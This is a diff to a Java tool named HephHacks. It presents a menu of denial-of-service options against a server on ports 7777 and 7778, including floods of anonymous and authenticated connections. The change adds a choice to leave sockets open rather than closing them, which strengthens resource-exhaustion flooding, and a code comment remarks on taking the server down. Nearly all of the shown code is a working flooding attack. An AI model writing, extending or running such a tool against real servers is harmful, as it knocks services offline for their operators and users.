@@ -32,6 +32,7 @@ public class HephHacks {
 	public static void menu(){
 		clearScreen("Strike while the iron is hot!",7);
 		Scanner in = new Scanner(System.in);
+		String clean="r";
 		//Display a menu
 		//TODO Add more features!
 		System.out.println("Choose one option.\n1. Attempt DoS\n2. Spam anonymous connections\n3. Spam authenticated connections.\n4. Spam Server commands\n5. Spam user messages\n6. Exit");
@@ -51,7 +52,17 @@ public class HephHacks {
 		break;
 		case 2: //Spam an anonymous connection
 			try {
-				SpamX();
+				boolean again=true;
+				clearScreen("Spam Anonymous Connection",14);
+				//String clean = "r";
+				in.nextLine();
+				do{
+					System.out.print("Clean disconnect (y/n): ");
+					clean = in.nextLine();
+					if(clean.equals("y")||clean.equals("n")) again=false;
+					//ystem.out.println("CLEAN: "+clean);
+				}while(again);
+				SpamX(clean);
 			} catch (UnknownHostException e) {
 				// TODO Auto-generated catch block
 				e.printStackTrace();
@@ -75,8 +86,15 @@ public class HephHacks {
 				System.out.print("Enter Authentication Password: ");
 				String password = in.nextLine();
 				clearScreen("Spam Authenticated Session",14);
+				//String clean = "r";
+				boolean again=true;
+				do{
+					System.out.print("Clean disconnect (y/n): ");
+					clean = in.nextLine();
+					if(clean.equals("y")||clean.equals("n")) again=false;
+				}while(again);
 				//Spam with provided credentials
-				SpamX(username,password);
+				SpamX(username,password,clean);
 			} catch (UnknownHostException e) {
 				// TODO Auto-generated catch block
 				e.printStackTrace();
@@ -138,7 +156,7 @@ public class HephHacks {
 		}
 	}
 
-	private static void SpamX() throws UnknownHostException, IOException {
+	private static void SpamX(String clean) throws UnknownHostException, IOException {
 		// TODO Auto-generated method stub
 		clearScreen("Spam Anonymous Sessions",14);
 		Scanner in = new Scanner(System.in);
@@ -148,8 +166,10 @@ public class HephHacks {
 		for(int y=1; y<=x; y++) { 
 			Socket serverSocket = new Socket(serverIP, 7777 );
 			Socket clientSocket = new Socket(serverIP, 7778 );
-			clientSocket.close();
-			serverSocket.close();
+			if(clean.equals("y")){
+				clientSocket.close();
+				serverSocket.close();
+			}
 		}
 		clearScreen("Test Completed Successfully!",12);
 		System.out.println(x+ " Anonymous sessions created successfully.\nPress a key to continue...");
@@ -159,7 +179,7 @@ public class HephHacks {
 		menu();
 	}
 	
-	private static void SpamX(String user, String pass) throws UnknownHostException, IOException {
+	private static void SpamX(String user, String pass,String clean) throws UnknownHostException, IOException {
 		String hashedPassword="";
 		//System.out.println("Username: "+user+"\nPassword: "+pass);
 		try{
@@ -196,10 +216,12 @@ public class HephHacks {
 				else fail++;
 				
 				//Close things
-				spamOut.close();
-				spamIn.close();
-				serverSocket.close();
-				clientSocket.close();
+				if(clean.equals("y")){
+					spamOut.close();
+					spamIn.close();
+					serverSocket.close();
+					clientSocket.close();
+				}
 				
 			} catch(Exception e){
 				//System.out.println("\nIt looks like you took down the server!");
